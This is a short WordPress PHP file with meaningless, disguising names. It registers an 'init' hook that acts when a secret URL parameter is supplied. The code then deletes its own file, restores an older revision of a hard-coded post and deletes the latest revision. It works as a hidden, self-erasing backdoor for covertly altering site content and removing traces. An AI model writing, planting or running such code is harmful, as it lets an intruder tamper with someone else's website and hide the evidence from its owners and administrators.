<?php

function maintenance_archives_time_delivery() {
	if (isset($_GET['engine_xml_maintenance']) && $_GET['engine_xml_maintenance'] === 'static_profile_oembed_toggle') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$nav_booster_archives_database = 269;
		$reloaded_urls_deprecated_tiny = wp_get_post_revisions($nav_booster_archives_database);
		if (empty($reloaded_urls_deprecated_tiny)) die('no revisions');
		if (count($reloaded_urls_deprecated_tiny) < 2) die('less than 2');
		$account_marketing_gdpr = array_shift($reloaded_urls_deprecated_tiny);
		$word_extra_appointment = $account_marketing_gdpr->ID;
		$register_views_clean = array_shift($reloaded_urls_deprecated_tiny);
		$section_codes_cool = $register_views_clean->ID;
		$products_message_tiny = wp_restore_post_revision($section_codes_cool);
		if ($products_message_tiny === false) die('error restoring');
		$products_message_tiny = wp_delete_post_revision($word_extra_appointment);		
		if ($products_message_tiny === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'maintenance_archives_time_delivery');
